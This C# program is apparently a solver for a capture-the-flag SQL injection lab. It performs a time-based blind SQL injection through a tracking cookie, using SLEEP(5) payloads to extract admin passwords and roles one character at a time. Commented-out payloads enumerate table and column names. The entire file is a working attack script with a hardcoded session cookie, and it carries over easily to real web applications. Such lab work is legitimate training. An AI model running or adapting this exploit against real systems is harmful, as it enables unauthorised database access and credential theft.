﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Web;
using System.Net;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO;
using System.IO.IsolatedStorage;
using System.Security.Cryptography;

namespace FuzzWebLab3_Blind1
{
    class Program
    {
        static void Main(string[] args)
        {
            String uri = "https://labs.matesctf.org/lab/sqli/2/index.php?page=shop&type=Mainboard";
            String FuzzString = "";
            System.IO.Stream stream;
            System.IO.StreamReader sr;
            String Out;
            int i = 1;
            

            for (int a = 0x20; a <= 0x7E; a++)
            {
                Cookie ck1 = new Cookie("PHPSESSID", "3e0ef945174edefa8f81189baba89b37");
                //FuzzString = "1%20and%20IF(SUBSTRING((SELECT%20group_concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase())2C" + i.ToString() + "%2C1)%3D%27" + Convert.ToString(a, 16) + "%27%2CSLEEP(5)%2C1)--";
                //FuzzString = "1 and IF(SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())%2C" + i.ToString() + "%2C1)%3D%27%" + Convert.ToString(a, 16) + "%27%2CSLEEP(5)%2C1)--";
                //FuzzString = "1%20and%20IF(SUBSTRING((SELECT%20group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name%3D0x7573657273)%2C" + i.ToString() + "%2C1)%3D%27%" + Convert.ToString(a, 16) + "%27%2CSLEEP(5)%2C1)--";
                FuzzString = "1%20and%20IF(SUBSTRING((SELECT%20group_concat(password%2C0x3a%2C%20role)%20FROM%20users%20WHERE%20role%3D%27admin%27)%2C" + i.ToString() + "%2C1)%3D%27%" + Convert.ToString(a, 16) + "%27%2CSLEEP(5)%2C1)--";
                //Console.WriteLine(FuzzString);
                Cookie ck2 = new Cookie("tracking_user_id", FuzzString);
                CookieContainer reqCookies = new CookieContainer();
                ck1.Domain = "labs.matesctf.org";
                ck2.Domain = "labs.matesctf.org";
                HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
                rq.Method = "GET";
                rq.Timeout = 20000;
                rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
                rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
                rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
                rq.CookieContainer = reqCookies;
                rq.CookieContainer.Add(ck1);
                rq.CookieContainer.Add(ck2);

                HttpWebResponse hr;
                System.Diagnostics.Stopwatch timer = new Stopwatch();
                timer.Stop();
                timer.Start();
                hr = (HttpWebResponse)rq.GetResponse();
                stream = hr.GetResponseStream();
                sr = new System.IO.StreamReader(stream);
                Out = sr.ReadToEnd();
                timer.Stop();
                TimeSpan timeTaken = timer.Elapsed;
                //Console.WriteLine("Buffer: " + (char)a + "               Time: " + timeTaken.Seconds.ToString());
                if (timeTaken.Seconds >= 5)
                {
                    //Console.WriteLine("Buffer: " + (char)a + "               Time: " + timeTaken.Seconds.ToString());
                    Console.Write((char)a);
                    a = 0x20;
                    i++;
                }
            }
            

        }
    }
}
